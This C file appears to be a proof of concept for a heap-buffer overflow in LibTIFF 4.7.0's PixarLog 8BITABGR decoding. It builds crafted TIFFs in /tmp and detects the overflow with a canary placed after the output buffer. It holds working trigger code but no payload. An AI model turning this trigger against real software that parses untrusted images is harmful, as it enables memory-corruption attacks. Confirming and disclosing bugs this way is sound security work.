/*
 * poc_canary.c — LibTIFF 4.7.0 PixarLog 8BITABGR Overflow: Canary Proof
 *
 * Places a 256-byte canary (0xDE pattern) immediately after the ABGR output
 * buffer. If the canary bytes are overwritten, the overflow is confirmed.
 *
 * Build:
 *   cc -g -I/tmp/tiff-4.7.0/libtiff \
 *      -o /tmp/poc_canary poc_canary.c \
 *      /tmp/tiff-4.7.0/libtiff/.libs/libtiff.a -lz
 *
 * Run:
 *   /tmp/poc_canary
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tiffio.h>

/* H must be divisible by 3 for overflow to trigger (no nsamples trim) */
#define WIDTH   100
#define HEIGHT  12
#define SPP     3

#define CANARY_SZ  256
#define CANARY_BYTE 0xDE

static void create_tiff(const char *path, int width, int height)
{
    TIFF *tif = TIFFOpen(path, "w");
    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH,      (uint32_t) width);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH,     (uint32_t) height);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, (uint16_t) SPP);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE,   (uint16_t) 8);
    TIFFSetField(tif, TIFFTAG_COMPRESSION,     COMPRESSION_PIXARLOG);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC,     PHOTOMETRIC_RGB);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG,    PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP,    (uint32_t) height);
    TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BIT);
    unsigned char row[width * SPP];
    memset(row, 128, sizeof(row));
    for (int y = 0; y < height; y++)
        TIFFWriteScanline(tif, row, (uint32_t) y, 0);
    TIFFClose(tif);
}

static int test_overflow(int width, int height)
{
    char path[64];
    snprintf(path, sizeof(path), "/tmp/poc_pixarlog_%dx%d.tif", width, height);
    create_tiff(path, width, height);

    TIFF *tif = TIFFOpen(path, "r");
    TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BITABGR);

    size_t occ  = (size_t) 4 * width * height;
    size_t llen = (size_t) SPP * width;
    size_t trim = occ % llen;
    size_t iters = (occ - trim) / llen;
    size_t last_write_end = (iters - 1) * llen + 4 * (size_t) width;
    int expect_overflow = (last_write_end > occ);

    /* Allocate: output buffer + canary zone */
    unsigned char *region = (unsigned char *) malloc(occ + CANARY_SZ);
    unsigned char *buf    = region;
    unsigned char *canary = region + occ;

    memset(buf,    0x00, occ);
    memset(canary, CANARY_BYTE, CANARY_SZ);

    printf("  %4dx%-4d H%%3=%d  occ=%5zu  trim=%zu  iters=%zu  last_write=[%zu..%zu]  buf_end=%zu  ",
           width, height, height % 3,
           occ, trim, iters,
           (iters-1)*llen, last_write_end - 1, occ - 1);

    TIFFReadEncodedStrip(tif, 0, buf, (tmsize_t) occ);
    TIFFClose(tif);

    /* Check canary */
    int overwritten = 0;
    for (int i = 0; i < CANARY_SZ; i++) {
        if (canary[i] != CANARY_BYTE) {
            overwritten = i + 1;
            break;
        }
    }
    if (overwritten)
        printf("OVERFLOW CONFIRMED: canary[0..%d] corrupted\n", overwritten - 1);
    else if (expect_overflow)
        printf("OVERFLOW EXPECTED but canary intact (realloc edge case?)\n");
    else
        printf("no overflow (expected)\n");

    free(region);
    return overwritten > 0;
}

int main(void)
{
    printf("LibTIFF 4.7.0 — PixarLog 8BITABGR heap-buffer-overflow POC\n");
    printf("Canary: %d bytes of 0x%02X placed immediately after output buffer\n\n",
           CANARY_SZ, CANARY_BYTE);
    printf("  Width  H    H%%3  occ    trim iters last_write    buf_end   result\n");
    printf("  -----------------------------------------------------------------------\n");

    int triggered = 0;

    /* H divisible by 3: should overflow */
    triggered += test_overflow(100, 3);
    triggered += test_overflow(100, 6);
    triggered += test_overflow(100, 9);
    triggered += test_overflow(100, 12);
    triggered += test_overflow(100, 30);
    triggered += test_overflow(500, 3);

    printf("\n");

    /* H not divisible by 3: no overflow */
    test_overflow(100, 10);
    test_overflow(100, 11);
    test_overflow(100, 13);

    printf("\n");
    if (triggered > 0)
        printf("[!] OVERFLOW CONFIRMED in %d/%d test cases\n", triggered, 6);
    else
        printf("[-] No overflow detected (unexpected — check build)\n");

    return triggered > 0 ? 1 : 0;
}
